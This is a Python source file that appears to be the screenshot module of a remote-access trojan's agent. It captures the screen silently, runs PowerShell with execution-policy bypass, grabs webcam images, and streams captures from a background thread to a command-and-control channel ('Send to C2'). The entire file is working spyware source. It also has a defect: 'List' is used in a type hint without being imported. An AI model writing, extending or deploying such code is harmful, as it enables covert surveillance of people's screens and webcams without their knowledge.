# agent/modules/screenshot.py
import os
import sys
import base64
import platform
import subprocess
import tempfile
from typing import Dict, Any, Optional
from datetime import datetime

# Try to import screenshot libraries
try:
    from PIL import ImageGrab, Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False


class Screenshot:
    """Screenshot capture module"""
    
    def __init__(self, agent):
        self.agent = agent
        self.commands = {
            'capture': self.capture_screenshot,
            'start_stream': self.start_stream,
            'stop_stream': self.stop_stream,
            'webcam': self.capture_webcam,
            'list_displays': self.list_displays
        }
        self.streaming = False
        self.stream_thread = None
    
    def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute screenshot command"""
        if command in self.commands:
            try:
                result = self.commands[command](parameters)
                return {'success': True, 'result': result}
            except Exception as e:
                return {'success': False, 'error': str(e)}
        else:
            return {'success': False, 'error': f'Unknown command: {command}'}
    
    def capture_screenshot(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Capture a screenshot"""
        display = params.get('display', 0)
        quality = params.get('quality', 85)
        format = params.get('format', 'png')
        
        screenshot_data = None
        resolution = None
        
        # Try different methods
        if MSS_AVAILABLE:
            screenshot_data, resolution = self._capture_with_mss(display, quality, format)
        elif PIL_AVAILABLE:
            screenshot_data, resolution = self._capture_with_pil(quality, format)
        elif platform.system() == 'Linux':
            screenshot_data, resolution = self._capture_with_scrot(quality, format)
        elif platform.system() == 'Darwin':
            screenshot_data, resolution = self._capture_with_screencapture(quality, format)
        elif platform.system() == 'Windows':
            screenshot_data, resolution = self._capture_with_powershell(quality, format)
        
        if screenshot_data:
            return {
                'data': screenshot_data,
                'resolution': resolution,
                'timestamp': datetime.utcnow().isoformat(),
                'format': format,
                'size': len(base64.b64decode(screenshot_data))
            }
        else:
            raise Exception("No screenshot method available")
    
    def _capture_with_mss(self, display: int, quality: int, format: str) -> tuple:
        """Capture using MSS library"""
        import mss
        from PIL import Image
        import io
        
        with mss.mss() as sct:
            # Get monitor info
            monitors = sct.monitors
            
            if display >= len(monitors):
                display = 0
            
            monitor = monitors[display] if display > 0 else sct.monitors[0]
            
            # Capture
            screenshot = sct.grab(monitor)
            
            # Convert to PIL Image
            img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
            
            # Save to buffer
            buffer = io.BytesIO()
            if format.lower() == 'jpg' or format.lower() == 'jpeg':
                img.save(buffer, format='JPEG', quality=quality)
            else:
                img.save(buffer, format='PNG')
            
            # Encode to base64
            screenshot_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
            resolution = {'width': screenshot.width, 'height': screenshot.height}
            
            return screenshot_data, resolution
    
    def _capture_with_pil(self, quality: int, format: str) -> tuple:
        """Capture using PIL ImageGrab"""
        import io
        
        # Capture screen
        screenshot = ImageGrab.grab()
        
        # Save to buffer
        buffer = io.BytesIO()
        if format.lower() == 'jpg' or format.lower() == 'jpeg':
            screenshot.save(buffer, format='JPEG', quality=quality)
        else:
            screenshot.save(buffer, format='PNG')
        
        # Encode to base64
        screenshot_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
        resolution = {'width': screenshot.width, 'height': screenshot.height}
        
        return screenshot_data, resolution
    
    def _capture_with_scrot(self, quality: int, format: str) -> tuple:
        """Capture using scrot on Linux"""
        temp_file = tempfile.mktemp(suffix=f'.{format}')
        
        try:
            # Use scrot to capture
            cmd = ['scrot']
            if format.lower() in ['jpg', 'jpeg']:
                cmd.extend(['--quality', str(quality)])
            cmd.append(temp_file)
            
            subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL)
            
            # Read the file
            with open(temp_file, 'rb') as f:
                screenshot_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Get resolution
            try:
                from PIL import Image
                img = Image.open(temp_file)
                resolution = {'width': img.width, 'height': img.height}
            except:
                # Fallback - get screen resolution
                output = subprocess.check_output(['xdpyinfo'], text=True)
                for line in output.split('\n'):
                    if 'dimensions:' in line:
                        dims = line.split()[1]
                        width, height = map(int, dims.split('x'))
                        resolution = {'width': width, 'height': height}
                        break
                else:
                    resolution = {'width': 0, 'height': 0}
            
            return screenshot_data, resolution
            
        except subprocess.CalledProcessError:
            raise Exception("scrot command failed")
        finally:
            if os.path.exists(temp_file):
                os.remove(temp_file)
    
    def _capture_with_screencapture(self, quality: int, format: str) -> tuple:
        """Capture using screencapture on macOS"""
        temp_file = tempfile.mktemp(suffix=f'.{format}')
        
        try:
            # Use screencapture
            cmd = ['screencapture', '-x']  # -x to disable sound
            if format.lower() == 'jpg' or format.lower() == 'jpeg':
                cmd.extend(['-t', 'jpg'])
            else:
                cmd.extend(['-t', 'png'])
            cmd.append(temp_file)
            
            subprocess.run(cmd, check=True)
            
            # Read the file
            with open(temp_file, 'rb') as f:
                screenshot_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Get resolution
            try:
                from PIL import Image
                img = Image.open(temp_file)
                resolution = {'width': img.width, 'height': img.height}
            except:
                # Fallback
                output = subprocess.check_output(
                    ['system_profiler', 'SPDisplaysDataType'],
                    text=True
                )
                # Parse output for resolution
                resolution = {'width': 0, 'height': 0}
                for line in output.split('\n'):
                    if 'Resolution:' in line:
                        # Extract resolution
                        import re
                        match = re.search(r'(\d+) x (\d+)', line)
                        if match:
                            resolution = {
                                'width': int(match.group(1)),
                                'height': int(match.group(2))
                            }
                            break
            
            return screenshot_data, resolution
            
        except subprocess.CalledProcessError:
            raise Exception("screencapture command failed")
        finally:
            if os.path.exists(temp_file):
                os.remove(temp_file)
    
    def _capture_with_powershell(self, quality: int, format: str) -> tuple:
        """Capture using PowerShell on Windows"""
        temp_file = tempfile.mktemp(suffix=f'.{format}')
        
        # PowerShell script to capture screenshot
        ps_script = f"""
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$width = $screen.Width
$height = $screen.Height
$left = $screen.Left
$top = $screen.Top

$bitmap = New-Object System.Drawing.Bitmap $width, $height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)

$bitmap.Save('{temp_file}', [System.Drawing.Imaging.ImageFormat]::{format.capitalize()})

Write-Output "$width,$height"
"""
        
        try:
            # Execute PowerShell
            result = subprocess.run(
                ['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps_script],
                capture_output=True,
                text=True
            )
            
            # Parse resolution
            if result.stdout:
                width, height = map(int, result.stdout.strip().split(','))
                resolution = {'width': width, 'height': height}
            else:
                resolution = {'width': 0, 'height': 0}
            
            # Read the file
            with open(temp_file, 'rb') as f:
                screenshot_data = base64.b64encode(f.read()).decode('utf-8')
            
            return screenshot_data, resolution
            
        except Exception as e:
            raise Exception(f"PowerShell screenshot failed: {e}")
        finally:
            if os.path.exists(temp_file):
                os.remove(temp_file)
    
    def start_stream(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Start screenshot streaming"""
        if self.streaming:
            return {'status': 'already_streaming'}
        
        interval = params.get('interval', 1)  # seconds
        quality = params.get('quality', 70)
        
        import threading
        
        def stream_loop():
            while self.streaming:
                try:
                    # Capture screenshot
                    screenshot = self.capture_screenshot({
                        'quality': quality,
                        'format': 'jpeg'
                    })
                    
                    # Send to C2
                    self.agent.comm.send_data({
                        'action': 'screenshot_stream',
                        'data': screenshot
                    })
                    
                    # Wait for interval
                    import time
                    time.sleep(interval)
                    
                except Exception as e:
                    print(f"Stream error: {e}")
        
        self.streaming = True
        self.stream_thread = threading.Thread(target=stream_loop)
        self.stream_thread.daemon = True
        self.stream_thread.start()
        
        return {
            'status': 'streaming_started',
            'interval': interval,
            'quality': quality
        }
    
    def stop_stream(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Stop screenshot streaming"""
        if not self.streaming:
            return {'status': 'not_streaming'}
        
        self.streaming = False
        
        if self.stream_thread:
            self.stream_thread.join(timeout=5)
            self.stream_thread = None
        
        return {'status': 'streaming_stopped'}
    
    def capture_webcam(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Capture webcam image"""
        device = params.get('device', 0)
        
        # Try OpenCV first
        try:
            import cv2
            
            # Open webcam
            cap = cv2.VideoCapture(device)
            
            if not cap.isOpened():
                raise Exception("Cannot open webcam")
            
            # Capture frame
            ret, frame = cap.read()
            cap.release()
            
            if not ret:
                raise Exception("Failed to capture frame")
            
            # Convert to JPEG
            _, buffer = cv2.imencode('.jpg', frame)
            webcam_data = base64.b64encode(buffer).decode('utf-8')
            
            return {
                'data': webcam_data,
                'device': device,
                'resolution': {
                    'width': frame.shape[1],
                    'height': frame.shape[0]
                },
                'timestamp': datetime.utcnow().isoformat()
            }
            
        except ImportError:
            pass
        
        # Platform-specific fallbacks
        if platform.system() == 'Windows':
            # Windows Media Foundation or DirectShow would be needed
            pass
        elif platform.system() == 'Darwin':
            # Use imagesnap on macOS
            try:
                temp_file = tempfile.mktemp(suffix='.jpg')
                subprocess.run(
                    ['imagesnap', '-w', '0.5', temp_file],
                    check=True,
                    stderr=subprocess.DEVNULL
                )
                
                with open(temp_file, 'rb') as f:
                    webcam_data = base64.b64encode(f.read()).decode('utf-8')
                
                os.remove(temp_file)
                
                return {
                    'data': webcam_data,
                    'device': device,
                    'timestamp': datetime.utcnow().isoformat()
                }
                
            except:
                pass
        elif platform.system() == 'Linux':
            # Use fswebcam or streamer
            try:
                temp_file = tempfile.mktemp(suffix='.jpg')
                subprocess.run(
                    ['fswebcam', '-r', '640x480', '--jpeg', '85', '-D', '1', temp_file],
                    check=True,
                    stderr=subprocess.DEVNULL
                )
                
                with open(temp_file, 'rb') as f:
                    webcam_data = base64.b64encode(f.read()).decode('utf-8')
                
                os.remove(temp_file)
                
                return {
                    'data': webcam_data,
                    'device': device,
                    'timestamp': datetime.utcnow().isoformat()
                }
                
            except:
                pass
        
        raise Exception("No webcam capture method available")
    
    def list_displays(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """List available displays"""
        displays = []
        
        if MSS_AVAILABLE:
            import mss
            
            with mss.mss() as sct:
                for i, monitor in enumerate(sct.monitors):
                    displays.append({
                        'id': i,
                        'name': f'Display {i}' if i > 0 else 'All Displays',
                        'left': monitor['left'],
                        'top': monitor['top'],
                        'width': monitor['width'],
                        'height': monitor['height'],
                        'primary': i == 1
                    })
                    
        elif platform.system() == 'Windows':
            try:
                import win32api
                
                monitors = win32api.EnumDisplayMonitors()
                for i, (hmon, hdc, rect) in enumerate(monitors):
                    left, top, right, bottom = rect
                    displays.append({
                        'id': i,
                        'name': f'Display {i + 1}',
                        'left': left,
                        'top': top,
                        'width': right - left,
                        'height': bottom - top,
                        'primary': i == 0
                    })
                    
            except:
                # Fallback
                displays.append({
                    'id': 0,
                    'name': 'Primary Display',
                    'width': 0,
                    'height': 0,
                    'primary': True
                })
                
        else:
            # Unix/Linux - parse xrandr
            try:
                output = subprocess.check_output(['xrandr'], text=True)
                
                display_id = 0
                for line in output.split('\n'):
                    if ' connected' in line and ' disconnected' not in line:
                        parts = line.split()
                        name = parts[0]
                        
                        # Find resolution
                        for part in parts:
                            if 'x' in part and '+' in part:
                                # Format: WIDTHxHEIGHT+X+Y
                                res_pos = part.split('+')
                                resolution = res_pos[0].split('x')
                                
                                displays.append({
                                    'id': display_id,
                                    'name': name,
                                    'width': int(resolution[0]),
                                    'height': int(resolution[1]),
                                    'left': int(res_pos[1]),
                                    'top': int(res_pos[2]),
                                    'primary': 'primary' in line
                                })
                                display_id += 1
                                break
                                
            except:
                displays.append({
                    'id': 0,
                    'name': 'Display',
                    'width': 0,
                    'height': 0,
                    'primary': True
                })
        
        return displays
